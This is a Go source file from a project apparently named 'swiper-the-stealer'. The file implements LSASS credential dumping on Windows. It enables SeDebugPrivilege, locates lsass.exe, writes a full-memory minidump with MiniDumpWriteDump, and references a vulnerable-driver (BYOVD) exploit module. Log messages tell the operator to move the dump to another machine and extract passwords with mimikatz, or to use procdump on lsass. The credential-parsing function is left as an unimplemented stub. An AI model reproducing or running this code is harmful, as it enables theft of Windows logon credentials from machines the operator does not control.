package lsass

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/pkg/logger"

	"golang.org/x/sys/windows"
)

// MimikatzMinidumpExtractor - Mimikatz's alternative approach
// When Credential Guard is enabled, mimikatz uses minidump creation
// This bypasses PPL/VBS by using legitimate Windows APIs that the kernel allows
//
// How mimikatz does it:
// 1. Use Task Manager / ProcDump / MiniDumpWriteDump to create LSASS dump
// 2. Parse the dump file offline to extract credentials
// 3. This works because the dump contains decrypted credential material
type MimikatzMinidumpExtractor struct {
	rtcore *byovd.RTCoreExploit
	logger *logger.Logger
}

func NewMimikatzMinidumpExtractor(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *MimikatzMinidumpExtractor {
	return &MimikatzMinidumpExtractor{
		rtcore: rtcore,
		logger: logger,
	}
}

const (
	MiniDumpWithFullMemory = 0x00000002
)

var (
	modDbgHelp            = windows.NewLazySystemDLL("dbghelp.dll")
	procMiniDumpWriteDump = modDbgHelp.NewProc("MiniDumpWriteDump")

	modAdvapi32               = windows.NewLazySystemDLL("advapi32.dll")
	procOpenProcessToken      = modAdvapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValue  = modAdvapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = modAdvapi32.NewProc("AdjustTokenPrivileges")
)

// CreateLsassMinidump - The REAL mimikatz approach when Credential Guard is enabled
// This is what "sekurlsa::minidump" does in mimikatz
func (mme *MimikatzMinidumpExtractor) CreateLsassMinidump(outputPath string) error {
	mme.logger.Info("=== MIMIKATZ MINIDUMP APPROACH ===")
	mme.logger.Info("Creating LSASS minidump (like mimikatz sekurlsa::minidump)")

	// Enable SeDebugPrivilege
	if err := mme.enableSeDebugPrivilege(); err != nil {
		return fmt.Errorf("failed to enable SeDebugPrivilege: %v", err)
	}

	// Find LSASS
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return fmt.Errorf("failed to create snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	var lsassPID uint32

	if err := windows.Process32First(snapshot, &pe); err != nil {
		return fmt.Errorf("failed to enumerate processes: %v", err)
	}

	for {
		processName := windows.UTF16ToString(pe.ExeFile[:])
		if processName == "lsass.exe" {
			lsassPID = pe.ProcessID
			break
		}

		if err := windows.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	if lsassPID == 0 {
		return fmt.Errorf("lsass.exe not found")
	}

	mme.logger.Infof("Found LSASS: PID %d", lsassPID)

	// Try to open LSASS with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
	// Even with Credential Guard, minidump creation is sometimes allowed
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
		false,
		lsassPID,
	)
	if err != nil {
		mme.logger.Warnf("OpenProcess failed (expected with Credential Guard): %v", err)
		mme.logger.Info("ALTERNATIVE: Use 'procdump64.exe -accepteula -ma lsass.exe lsass.dmp' from SysInternals")
		mme.logger.Info("Then run: mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\"")
		return fmt.Errorf("cannot create minidump directly - use ProcDump as Administrator")
	}
	defer windows.CloseHandle(hProcess)

	// Create output file
	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %v", err)
	}

	outFile, err := os.Create(outputPath)
	if err != nil {
		return fmt.Errorf("failed to create output file: %v", err)
	}
	defer outFile.Close()

	mme.logger.Infof("Creating minidump: %s", outputPath)

	// Call MiniDumpWriteDump
	ret, _, err := procMiniDumpWriteDump.Call(
		uintptr(hProcess),
		uintptr(lsassPID),
		uintptr(outFile.Fd()),
		uintptr(MiniDumpWithFullMemory),
		0, // No exception information
		0, // No user stream
		0, // No callback
	)

	if ret == 0 {
		return fmt.Errorf("MiniDumpWriteDump failed: %v", err)
	}

	mme.logger.Infof("✓ Minidump created successfully: %s", outputPath)
	mme.logger.Info("Next steps:")
	mme.logger.Info("1. Copy this dump to another machine")
	mme.logger.Info("2. Run mimikatz: sekurlsa::minidump lsass.dmp")
	mme.logger.Info("3. Extract credentials: sekurlsa::logonPasswords")

	return nil
}

// enableSeDebugPrivilege enables the SeDebugPrivilege for the current process
func (mme *MimikatzMinidumpExtractor) enableSeDebugPrivilege() error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}

	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]struct {
			Luid       LUID
			Attributes uint32
		}
	}

	const (
		TOKEN_ADJUST_PRIVILEGES = 0x0020
		TOKEN_QUERY             = 0x0008
		SE_PRIVILEGE_ENABLED    = 0x00000002
	)

	var hToken windows.Token
	currentProcess, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}

	ret, _, err := procOpenProcessToken.Call(
		uintptr(currentProcess),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hToken))

	var luid LUID
	privilegeName, err := windows.UTF16PtrFromString("SeDebugPrivilege")
	if err != nil {
		return err
	}

	ret, _, err = procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privilegeName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
	}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
	}

	return nil
}

// ParseMinidumpForCredentials - Parse a minidump file to extract credentials
// This mimics "sekurlsa::logonPasswords" on a minidump
func (mme *MimikatzMinidumpExtractor) ParseMinidumpForCredentials(dumpPath string) ([]Credential, error) {
	mme.logger.Info("=== PARSING MINIDUMP (like sekurlsa::minidump + sekurlsa::logonPasswords) ===")

	// Read the minidump file
	dumpData, err := os.ReadFile(dumpPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read minidump: %v", err)
	}

	mme.logger.Infof("Loaded minidump: %d bytes", len(dumpData))

	// Parse minidump header
	if len(dumpData) < 32 {
		return nil, fmt.Errorf("invalid minidump file (too small)")
	}

	// Check MDMP signature
	signature := string(dumpData[0:4])
	if signature != "MDMP" {
		return nil, fmt.Errorf("invalid minidump signature: %s", signature)
	}

	mme.logger.Info("✓ Valid minidump signature")

	// In a real implementation, we would:
	// 1. Parse MINIDUMP_HEADER
	// 2. Find MINIDUMP_MEMORY_LIST
	// 3. Locate lsasrv.dll memory range
	// 4. Find LogonSessionList patterns
	// 5. Walk credential structures
	// 6. Decrypt with LsaUnprotectMemory

	mme.logger.Warn("Full minidump parsing not yet implemented")
	mme.logger.Info("Use mimikatz to parse this dump:")
	mme.logger.Infof("  mimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\"", dumpPath)

	return nil, fmt.Errorf("minidump parsing not implemented - use mimikatz")
}
